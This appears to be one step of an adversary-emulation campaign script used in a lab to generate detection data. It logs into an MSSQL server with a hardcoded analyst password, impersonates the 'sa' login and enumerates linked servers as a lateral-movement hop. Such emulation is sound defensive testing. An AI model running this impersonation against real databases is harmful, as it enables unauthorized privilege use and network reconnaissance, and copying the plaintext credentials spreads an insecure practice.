#!/usr/bin/env bash
# T040 — MSSQL linked server hop to linux01 from ws01 (analyst_t1)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T040-MSSQL-LINKED-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T040 MSSQL linked server hop | ${CASE_ID} | T0=${T0} ==="

SERVER="${SERVER:-192.168.77.22}"
CMD='
$ErrorActionPreference = "Stop";
Add-Type -AssemblyName System.Data;
$connStr = "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;";
$conn = New-Object System.Data.SqlClient.SqlConnection($connStr);
$conn.Open();
Write-Output "SQL_OK: connected to mbr01 as analyst_t1";
$cmd = $conn.CreateCommand();
$cmd.CommandText = "EXECUTE AS LOGIN = ''sa''; EXEC sp_helpserver; REVERT";
$reader = $cmd.ExecuteReader();
while ($reader.Read()) { Write-Output $reader[0] }
$reader.Close();
$conn.Close();
Write-Output "T040_OK: linked server enumeration complete"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T040 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T040 run complete ==="
